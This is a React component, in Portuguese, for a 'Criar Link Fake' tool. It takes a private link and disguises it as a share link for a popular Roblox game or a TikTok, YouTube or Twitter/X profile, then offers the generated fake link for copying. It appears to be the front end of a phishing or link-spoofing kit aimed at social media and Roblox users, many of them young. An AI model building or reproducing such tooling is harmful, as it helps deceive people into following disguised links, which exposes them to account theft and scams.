import React, {useState} from 'react'

const ROBLOX_GAMES = {
  "99 Noites": "https://www.roblox.com/share?code=4a3bfb1c8c8247458d7996f25d8cba65&type=Server",
  "Pls Donate": "https://www.roblox.com/pt/games/8737602449/PLS-DONATE",
  "Doors": "https://www.roblox.com/share?code=3e53b3c450edb044882857e27370bb77&type=Server",
  "Grow a garden": "https://www.roblox.com/share?code=b31ee3faf6f22a4fab1df07d32bf0646&type=Server",
  "Murder Mystery 2": "https://www.roblox.com/pt/games/142823291/Murder-Mystery-2",
  "Adopt Me": "https://www.roblox.com/share?code=a9ab77e67d758848b6100045442e61eb&type=Server",
  "Blue Lock": "https://www.roblox.com/share?code=5f5f0967e99e3a4c9f82421b51a9a4ff&type=Server",
  "Jujutsu Shinanigans": "https://www.roblox.com/share?code=234ad24be74f3f44aad2eebdc208555f&type=Server"
}

export default function CreateFake(){
  const [network, setNetwork] = useState('roblox')
  const [username, setUsername] = useState('')
  const [privateLink, setPrivateLink] = useState('')
  const [robloxGame, setRobloxGame] = useState(Object.values(ROBLOX_GAMES)[0])
  const [result, setResult] = useState(null)
  const [error, setError] = useState(null)

  async function handleCreate(e){
    e.preventDefault(); setError(null);
    const res = await fetch('/api/create/linkfake', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ network, username, privateLink, robloxGame }) })
    const data = await res.json();
    if (data.error) setError(data.error)
    else setResult(data)
  }

  return (
    <div className="max-w-2xl mx-auto space-y-4">
      <div className="card p-4">
        <h3 className="font-semibold">Criar Link Fake</h3>
        <form onSubmit={handleCreate} className="space-y-3 mt-3">
          <label className="text-sm">Rede</label>
          <select className="w-full p-2 bg-neutral-900 rounded" value={network} onChange={e=>setNetwork(e.target.value)}>
            <option value="roblox">Roblox</option>
            <option value="tiktok">TikTok</option>
            <option value="youtube">YouTube</option>
            <option value="twitter">Twitter / X</option>
          </select>

          {network !== 'roblox' && (
            <div>
              <label className="text-sm">Nome de usuário (ex: neymar1337)</label>
              <input className="w-full p-2 bg-neutral-900 rounded" value={username} onChange={e=>setUsername(e.target.value)} required />
            </div>
          )}

          <div>
            <label className="text-sm">Link privado (obrigatório)</label>
            <input className="w-full p-2 bg-neutral-900 rounded" value={privateLink} onChange={e=>setPrivateLink(e.target.value)} placeholder="https://www.roblox.com/share?code=..." required />
          </div>

          {network === 'roblox' && (
            <div>
              <label className="text-sm">Escolha o jogo para disfarçar</label>
              <select className="w-full p-2 bg-neutral-900 rounded" value={robloxGame} onChange={e=>setRobloxGame(e.target.value)}>
                {Object.keys(ROBLOX_GAMES).map(k=> (<option key={k} value={ROBLOX_GAMES[k]}>{k}</option>))}
              </select>
            </div>
          )}

          <div className="flex gap-2">
            <button className="px-4 py-2 rounded" style={{background:'var(--purple)'}}>Criar link privado</button>
          </div>
        </form>
      </div>

      {result && (
        <div className="card p-4">
          <h4 className="font-medium">Link gerado</h4>
          <pre className="bg-black p-3 rounded mt-2">{result.output}</pre>
          <div className="flex gap-2 mt-2">
            <button onClick={()=>{navigator.clipboard.writeText(result.output); alert('Link fake copiado')}} className="px-3 py-1 rounded" style={{background:'var(--purple)'}}>Copiar</button>
            <a href={result.link} className="px-3 py-1 rounded bg-neutral-800">Abrir link</a>
          </div>
        </div>
      )}

      {error && <div className="text-rose-400">{error}</div>}
    </div>
  )
}
